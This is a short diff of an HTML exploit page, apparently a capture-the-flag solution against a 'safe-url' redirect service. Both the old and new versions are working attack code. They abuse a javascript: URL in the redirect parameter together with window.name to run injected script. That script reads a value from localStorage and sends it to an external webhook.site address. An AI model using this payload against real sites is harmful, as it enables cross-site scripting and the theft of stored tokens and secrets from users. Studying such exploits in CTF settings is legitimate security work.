@@ -1,9 +1,11 @@
 <!DOCTYPE html>
 <script>
-    let payload = "javascript://%0Aeval(name).safe-url.ctfi.ng";
-
-    window.open(
-        "https://safe-url.ctfi.ng/?redirect=" + encodeURIComponent(payload),
-        "fetch(`https://webhook.site/eb84ac19-a281-4430-a79c-d9637e3b02dc`+localStorage.getItem(`flag`))"
-    );
+(function () {
+  var WH = 'https://webhook.site/eb84ac19-a281-4430-a79c-d9637e3b02dc';
+  window.name = '<script>fetch("'
+    + WH +
+    '?f="+encodeURIComponent(localStorage.getItem("flag")))</'+'script>';
+  location.href = 'https://safe-url.ctfi.ng/?redirect=' +
+    encodeURIComponent('javascript://safe-url.ctfi.ng/%0Aname');
+})();
 </script>
